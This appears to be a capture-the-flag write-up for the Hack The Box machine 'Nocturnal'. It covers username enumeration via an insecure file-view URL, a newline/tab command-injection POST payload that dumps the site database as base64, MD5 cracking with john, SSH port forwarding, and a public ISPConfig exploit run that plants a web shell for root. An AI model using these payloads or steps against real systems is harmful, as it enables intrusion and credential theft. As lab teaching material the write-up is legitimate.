# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.18.73 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 22:05 CEST
Nmap scan report for 10.129.18.73
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.93 seconds

```

### Detailed port scan

At the gedetialized port scan go to get more information from the services who are open on the ip address.

```
nmap -p22,80 -sCV 10.129.18.73 -vvvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 22:25 CEST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:25
Completed NSE at 22:25, 0.00s elapsed
Initiating Ping Scan at 22:25
Scanning 10.129.18.73 [4 ports]
Completed Ping Scan at 22:25, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:25
Scanning nocturnal.htb (10.129.18.73) [2 ports]
Discovered open port 80/tcp on 10.129.18.73
Completed SYN Stealth Scan at 22:25, 1.22s elapsed (2 total ports)
Initiating Service scan at 22:25
Scanning 1 service on nocturnal.htb (10.129.18.73)
Completed Service scan at 22:26, 7.04s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.18.73.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 6.47s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.32s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Nmap scan report for nocturnal.htb (10.129.18.73)
Host is up, received echo-reply ttl 63 (0.018s latency).
Scanned at 2025-04-16 22:25:57 CEST for 15s

PORT   STATE    SERVICE REASON         VERSION
22/tcp filtered ssh     no-response
80/tcp open     http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: Welcome to Nocturnal
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:26
Completed NSE at 22:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (152B)
```

Now i did go to the webpage of nocturnal. There is saw that we can or login with a allready know useraccount or that i can register a new useraccount. For now i will register a new user account and he will have the following credentials:

| Usernames | Password |
| --------- | -------- |
| test      | test     |
Once the registration is done, you can login with the above credentials. Once logged in you will see the following page.

![[Pasted image 20250416191601.png]]

From there you can upload the following types of files.
- Word
- Excel
- PDF

I just uploaded a file, regardless of its extension, as long as it was one of these three. Once the file has been uploaded, you will receive the following URL.

```
<li>
   <a href="view.php?username=test&file=d00001-001.pdf"> d00001-001.pdf </a>
<span>(Uploaded on 2025-07-08 17:58:56)</span>
</li>
```

I then started looking for a username that would allow me to log in to the admin login page. I did this by using FUFF.

```
┌──(kali㉿kali)-[~/HTB/Nocturnal]
└─$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=d00001-001.pdf' -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -H "Cookie: PHPSESSID=7dc06j681v2al72b4lj8nck9uq" -fc 403 -ac  
///
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 91ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 87ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 88ms]
```

If we look up the URL in our web browser and change the name test to the users we found, you will arrive at the following file if you set the name to `amanda`.

![[Pasted image 20250708204328.png]]

I downloaded the `privacy.odt` file to my own machine. I unzipped the `privacy.odt` file and you can see that it contained the following files.

```
┌──(kali㉿kali)-[~/HTB/Nocturnal]
└─$ unzip privacy.odt                  
Archive:  privacy.odt
 extracting: mimetype                
   creating: Configurations2/accelerator/
   creating: Configurations2/images/Bitmaps/
   creating: Configurations2/toolpanel/
   creating: Configurations2/floater/
   creating: Configurations2/statusbar/
   creating: Configurations2/toolbar/
   creating: Configurations2/progressbar/
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/
  inflating: styles.xml              
  inflating: manifest.rdf            
  inflating: content.xml             
  inflating: meta.xml                
  inflating: settings.xml            
 extracting: Thumbnails/thumbnail.png  
  inflating: META-INF/manifest.xml
```

I searched for a password in one of the files using the grep command. As you can see below, Amanda's password was in the `context.xml` file.

```
Dear <text:span text:style-name="T1">Amanda</text:span>,</text:p><text:p text:style-name="P1">Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services
```

When you log in with Amanda's login details, you will see on the page that you can log in to the admin panel.

![[Pasted image 20250708205554.png]]

When you click on it, you will be redirected to a page containing all the files that you can back up and download using the Amanda password.

![[Pasted image 20250708205749.png]]

You can unzip this backup.zip folder using the password and inspect the files.

```
┌──(kali㉿kali)-[~/HTB/Nocturnal]
└─$ unzip backup_2025-07-08.zip 
Archive:  backup_2025-07-08.zip
[backup_2025-07-08.zip] admin.php password: 
  inflating: admin.php               
   creating: uploads/
  inflating: uploads/privacy.odt     
  inflating: register.php            
  inflating: login.php               
  inflating: dashboard.php           
  inflating: index.php               
  inflating: view.php                
  inflating: logout.php              
  inflating: style.css 
```

I checked to see if there were any other usernames and passwords in it, but this was not the case. By using the grep command again, you can see that it contains SQLITE. I then used the grep command to search for `.db` and found the following path.

```
┌──(kali㉿kali)-[~/HTB/Nocturnal]
└─$ grep -r ".db"   
login.php:$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

This file is apparently not among the downloaded files that I downloaded from the admin panel.

You will be able to perform command injection because the admin.php file contains the characters that are on the blacklist. If you use characters for command injection that are not on the blacklist, you should be able to access the file.

```
kali㉿kali)-[~/HTB/Nocturnal]
└─$ cat admin.php                                                     
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}
///

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}

```

I am going to retrieve the file from the server by performing a command injection using the following command in a POST request. https://medium.com/%40yasmeena_rezk/basic-os-command-injection-8f2c9b4ecb54

```
POST /admin.php HTTP/1.1

Host: nocturnal.htb

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://nocturnal.htb/admin.php

Cookie: PHPSESSID=r6icssnqck1dnksln88v4s3o7k

Connection: keep-alive

password=%0Abash%09-c%09"base64%09/var/www/nocturnal_database/nocturnal_database.db"%0A&backup=Create+Backup
```

When you send this POST Request, you will see that we receive a base64 code. This code is too long, so I have replaced it with dots.

```
<a href='backups/backup_2025-07-09.zip' class='download-button' download>Download Backup</a><h3>Output:</h3><pre>sh: 3: backups/backup_2025-07-09.zip: Permissibash: -c: option requires an argument
U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAAEQAAAAUAAAAAAAAAAAAAAAIAAAAEAAAAAAAAAAAA
AAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARAC4/2Q0P+AAEDeYADzUPzQ7j
DeYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..............
```

I will put this base64 code in a file and give it the same name as the database. I will then open this file with the sqlite3 tool.

```
echo '........JAQFAAEjMwJwcml2YWN5Lm9kdDIw
MjQtMTAtMTggMDI6MDU6NTM=' | base64 -d > nocturnal_database.db
```

Checking the database for usernames and password hashes.

```
sqlite3 nocturnal_database.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
uploads  users  
sqlite> SELECT * FROM users
   ...> ;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
```

We will put the hashes in a file and try to crack them using john.

```
┌──(kali㉿kali)-[~/HTB/Nocturnal]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
slowmotionapocalypse (?)     
1g 0:00:00:00 DONE (2025-07-09 19:24) 1.694g/s 24310Kp/s 24310Kc/s 103503KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

However, you cannot see which user's password has been cracked above. You can find this out by using the following command. This shows that the cracked password belongs to the user Tobias.

```
┌──(kali㉿kali)-[~/HTB/Nocturnal]
└─$ john --format=raw-md5 --show hashes    
tobias:slowmotionapocalypse

1 password hash cracked, 4 left
```

Now you will be able to log in as the user tobias on the ssh server.

User Flag: 574c1f0235bcff4352d39a1d5691a121

```
tobias@nocturnal:~$ cat user.txt 
574c1f0235bcff4352d39a1d5691a121
```

By looking at the command below, you can see that there is a localhost listening on port 8080. So if I now do port forwarding, I will bring up a web page at http://127.0.0.1:8080.

```
tobias@nocturnal:~$ ss -tuln              
udp     127.0.0.53%lo:53     
tcp     127.0.0.1:8080   
```

We are going to do port forwarding for the web server that is running on the localhost on port 8080.

```
┌──(kali㉿kali)-[~]
└─$ ssh tobias@nocturnal.htb -L 8080:127.0.0.1:8080 
```

which we can then use to log in. I knew the password for the user tobias, so I tried to log in with that, but as you will see if you try this yourself, you will not be able to log in because the credentials are incorrect. I then tried using the password and the user admin instead, and as you can see, I was able to log in with that.

![[Pasted image 20250709195143.png]]

I have now gone to the help tab to see what version the web server is running. As you can see, the web server is running ISPConfig Version: 3.2.10p1.

![[Pasted image 20250709195512.png]]

So I started looking for an exploit. If you enter the following search term `exploit ISPConfig Version: 3.2.10p1 github` in the URL, you will find the following exploit. https://github.com/ajdumanhug/CVE-2023-46818

```
┌──(kali㉿kali)-[~/HTB/Nocturnal/CVE-2023-46818]
└─$ python3 CVE-2023-46818.py http://127.0.0.1:8080/ admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_b74bd18e6cd4b2630ddbcf25
[+] CSRF Key: 194724e7f257d59a3f2f6dfb9732d8b578b2beee
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8080/admin/sh.php
[+] Launching shell...

ispconfig-shell# ls
```

I have found the root file and this machine has been cracked.

Root Flag: 6f2ceb9e74ac267a896a06cb9e00a1a2

```
ispconfig-shell# cat /root/root.txt
6f2ceb9e74ac267a896a06cb9e00a1a2
```

![[Pasted image 20250709195821.png]]